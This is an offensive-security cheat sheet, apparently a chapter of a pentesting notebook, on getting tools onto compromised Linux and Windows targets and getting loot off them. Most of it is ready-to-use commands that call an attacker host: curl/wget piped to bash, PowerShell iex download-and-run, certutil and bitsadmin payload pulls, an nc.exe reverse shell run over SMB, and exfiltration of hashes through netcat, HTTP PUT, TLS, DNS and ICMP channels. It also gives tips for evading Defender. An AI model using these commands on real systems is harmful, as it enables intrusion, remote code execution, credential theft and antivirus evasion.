# 11 — File Transfers

The unglamorous but constant problem: get a binary onto the target, or a loot file off it. Method choice depends on what's installed, what's egress-allowed, and what's stealth-acceptable.

---

## 1. Decision Matrix

| Need | First-choice method |
|------|---------------------|
| Linux target, outbound HTTP allowed | `curl` / `wget` to attacker HTTP server |
| Windows target, modern PowerShell | `Invoke-WebRequest` (`iwr`) |
| Windows target, legacy / no PS | `certutil`, `bitsadmin` |
| Outbound blocked, inbound allowed | bind-port + push from attacker |
| Stealth needed | DNS or HTTPS over 443 |
| Lots of files | SMB share via impacket |
| Fragmentation through console | base64 paste |

---

## 2. Attacker-Side HTTP Server

The bread-and-butter.

```bash
# In your loot dir:
python3 -m http.server 80
# or:
python3 -m http.server 8000
# or:
sudo python3 -m http.server 80    # if you want port 80 specifically
```

Better than `python -m http.server`:
```bash
pipx install updog
updog -p 8000               # has upload form too
```

Or with uploads supported:
```bash
# python3 PUT-supporting server
python3 -c "
import http.server,socketserver
class H(http.server.SimpleHTTPRequestHandler):
    def do_PUT(self):
        l=int(self.headers['Content-Length'])
        with open(self.path[1:],'wb') as f: f.write(self.rfile.read(l))
        self.send_response(200);self.end_headers()
socketserver.TCPServer(('',8000),H).serve_forever()"
```

---

## 3. Linux Target → Pull from Attacker

### 3.1 curl
```bash
curl -O http://<atk>/file
curl http://<atk>/file -o /tmp/file
curl http://<atk>/script.sh | bash
curl -fsSL http://<atk>/script.sh | bash       # strict
```

### 3.2 wget
```bash
wget http://<atk>/file
wget http://<atk>/file -O /tmp/file
wget -qO- http://<atk>/script.sh | bash
```

### 3.3 Bash /dev/tcp (no curl/wget)
```bash
exec 3<>/dev/tcp/<atk>/80
echo -e "GET /file HTTP/1.0\r\nHost: <atk>\r\n\r\n" >&3
cat <&3 > /tmp/out
```
Strip HTTP headers from the result.

### 3.4 Python
```bash
python3 -c "import urllib.request; urllib.request.urlretrieve('http://<atk>/f', '/tmp/f')"
```

### 3.5 SCP / SSH (when SSH outbound)
```bash
scp /tmp/loot user@<atk>:/loot/
```

### 3.6 ftp / tftp
```bash
ftp <atk>            # interactive
echo -e "open <atk>\nuser anonymous anonymous\nbinary\nget file\nquit" | ftp -n
tftp <atk> -c get file       # tftp
```

---

## 4. Linux Target → Push to Attacker

### 4.1 nc / netcat
```bash
# attacker:
nc -lnvp 9001 > received.bin
# target:
nc <atk> 9001 < /loot/file
```

### 4.2 curl PUT
```bash
# attacker (PUT-supporting server, see §2)
# target:
curl -T /loot/file http://<atk>:8000/file
```

### 4.3 SCP
```bash
scp /loot/file user@<atk>:/incoming/
```

### 4.4 base64 paste
For tiny binaries when the network is unfriendly:
```bash
base64 -w0 /loot/file
# copy stdout, paste on attacker:
echo '<paste>' | base64 -d > /tmp/file
```

---

## 5. Windows Target → Pull from Attacker

### 5.1 PowerShell (modern, Win7+)
```powershell
iwr http://<atk>/file -o C:\Tasks\file
iwr http://<atk>/file -OutFile C:\Tasks\file -UseBasicParsing
# stage and run
iex (iwr http://<atk>/Invoke-PowerView.ps1 -UseBasicParsing).Content
```

### 5.2 certutil (legacy / fallback)
```cmd
certutil -urlcache -split -f http://<atk>/nc.exe C:\Tasks\nc.exe
:: clear cache after:
certutil -urlcache -split -f http://<atk>/nc.exe delete
```

### 5.3 bitsadmin (legacy)
```cmd
bitsadmin /transfer myJob /download /priority normal http://<atk>/nc.exe C:\Tasks\nc.exe
```

### 5.4 PowerShell DownloadString (in-memory)
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://<atk>/script.ps1')
```

### 5.5 PowerShell with cookie / auth
```powershell
$wc = New-Object Net.WebClient
$wc.Headers.Add('Cookie','session=abc')
$wc.DownloadFile('http://<atk>/file','C:\Tasks\file')
```

### 5.6 SMB pull (impacket-smbserver)
**Attacker:**
```bash
impacket-smbserver share /home/me/loot -smb2support
# Anonymous works by default.
```
**Target (Windows):**
```cmd
copy \\<atk>\share\nc.exe C:\Tasks\
:: or run directly without dropping:
\\<atk>\share\nc.exe <atk> 4444 -e cmd.exe
```
With credentials:
```bash
impacket-smbserver share /loot -smb2support -username admin -password 'p'
```
On target:
```cmd
net use Z: \\<atk>\share /user:admin p
```

### 5.7 FTP (legacy DOS)
```cmd
echo open <atk> 21> ftp.txt
echo anonymous>> ftp.txt
echo password>> ftp.txt
echo binary>> ftp.txt
echo get nc.exe>> ftp.txt
echo bye>> ftp.txt
ftp -s:ftp.txt
```

---

## 6. Windows Target → Push to Attacker

### 6.1 PowerShell upload (custom HTTP)
```powershell
$bytes = [IO.File]::ReadAllBytes('C:\loot\hashes.txt')
$req = [Net.WebRequest]::Create('http://<atk>:8000/hashes.txt')
$req.Method = 'PUT'
$req.ContentType = 'application/octet-stream'
$s = $req.GetRequestStream(); $s.Write($bytes,0,$bytes.Length); $s.Close()
$req.GetResponse()
```

### 6.2 SMB push (impacket-smbserver writeable)
**Attacker:**
```bash
impacket-smbserver share /home/me/incoming -smb2support
```
**Target:**
```cmd
copy C:\loot\hashes.txt \\<atk>\share\
```

### 6.3 nc.exe push
```cmd
nc.exe <atk> 9001 < C:\loot\hashes.txt
```
(Attacker: `nc -lnvp 9001 > hashes.txt`.)

### 6.4 base64 paste
```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\loot\file.bin'))
```
Paste output on attacker:
```bash
echo '<paste>' | base64 -d > file.bin
```

---

## 7. SSH-Centric Transfers (Best When Available)

### 7.1 scp
```bash
scp file user@target:/tmp/                      # push
scp user@target:/loot/file ./                   # pull
scp -r dir user@target:/tmp/                    # recursive
```

### 7.2 sftp
```bash
sftp user@target
sftp> put localfile
sftp> get remotefile
```

### 7.3 rsync (efficient for big / partial)
```bash
rsync -avz file user@target:/tmp/
rsync -avz --partial --progress user@target:/loot/ ./loot/
```

### 7.4 SSHFS (mount remote dir)
```bash
mkdir /mnt/r
sshfs user@target:/loot /mnt/r
```

### 7.5 stdin/stdout magic
```bash
# tar pipe — copy directory in one shot
ssh user@target 'tar czf - /loot' | tar xzf -
# reverse
tar czf - /local | ssh user@target 'tar xzf - -C /tmp/'
```

---

## 8. Encrypted / Obfuscated Channels

### 8.1 socat with TLS
**Attacker:**
```bash
openssl req -x509 -newkey rsa:4096 -keyout k.pem -out c.pem -days 30 -nodes -subj '/CN=x'
cat k.pem c.pem > server.pem
socat -d -d OPENSSL-LISTEN:443,reuseaddr,cert=server.pem,verify=0 STDOUT > received.bin
```
**Target:**
```bash
socat -d -d OPEN:/loot/file,rdonly OPENSSL:<atk>:443,verify=0
```

### 8.2 OpenSSL one-shot
```bash
# attacker:
openssl s_server -quiet -cert c.pem -key k.pem -port 443 > received
# target:
openssl s_client -quiet -connect <atk>:443 < /loot/file
```

### 8.3 GPG encrypt before transit
```bash
gpg -c file                          # symmetric
gpg --output file.gpg --symmetric --cipher-algo AES256 file
# transfer file.gpg, then on receiver:
gpg --decrypt file.gpg > file
```

---

## 9. Stealth / Egress-Filtered Networks

### 9.1 DNS exfil
**dnscat2** (https://github.com/iagox86/dnscat2):
- Server on attacker (authoritative for a delegated domain)
- Client on target → tunnels TCP/UDP through DNS
Slow, but punches through near everything.

### 9.2 ICMP exfil
- `icmpsh` (https://github.com/inquisb/icmpsh) — a shell over ICMP
- `ptunnel` — TCP-over-ICMP

### 9.3 HTTPS-only networks
Use 443 always. Commit to TLS:
```bash
socat openssl-listen:443,cert=server.pem,verify=0 -                # attacker
socat - openssl:<atk>:443,verify=0 < /loot/file                    # target
```

---

## 10. Big File Strategies

### 10.1 Compress
Always:
```bash
tar czf - /loot | gzip -9 > loot.tar.gz
# or
zip -r9 loot.zip /loot
```

### 10.2 Split
Useful when the channel hates large bytes:
```bash
split -b 1M loot.tar.gz part-
# transfer part-* individually
cat part-* > loot.tar.gz
```

### 10.3 Resume
- `wget -c <url>` — continue partial download
- `rsync --partial --progress` — best resume support
- `curl -C -` — continue at offset

### 10.4 Hash-verify after transfer
```bash
sha256sum loot.tar.gz    # compare both sides
```
Otherwise you'll get cryptic "this exploit didn't run" debugging.

---

## 11. Common Failures & Fixes

| Symptom | Likely cause |
|---------|--------------|
| `curl: command not found` | Use `wget`, or fall through to bash `/dev/tcp` |
| `Permission denied` writing to `/tmp` | Use `/dev/shm` or `/var/tmp` |
| Windows `iwr` hangs forever | Add `-UseBasicParsing` (no IE engine) |
| Defender quarantines on download | rename, encrypt, or stage in-memory |
| `certutil` reports success but file missing | `-split` flag mandatory; check antivirus quarantine |
| Transferred binary is 0 bytes | server delivered HTML 404; verify URL |
| Garbled binary | text-mode FTP; use `binary` |
| Shell hangs on `nc` push | listener didn't bind; or stdin held open |

---

## 12. Quick Reference (memorize)

```bash
# Attacker (start before each transfer):
python3 -m http.server 80
impacket-smbserver share . -smb2support           # SMB share

# Linux target pull:
curl http://<atk>/x -o /tmp/x          ;   wget http://<atk>/x -O /tmp/x

# Windows target pull (PS):
iwr http://<atk>/x -o C:\Tasks\x

# Windows target pull (CMD):
certutil -urlcache -split -f http://<atk>/x C:\Tasks\x

# Windows target SMB:
copy \\<atk>\share\x C:\Tasks\

# Linux push (via nc):
# atk: nc -lnvp 9001 > out
# tgt: nc <atk> 9001 < /file

# SSH all-purpose:
scp /file user@<atk>:/in/
```

---

*The transfer is incidental. Pick the simplest method that egress allows, verify integrity, move on.*
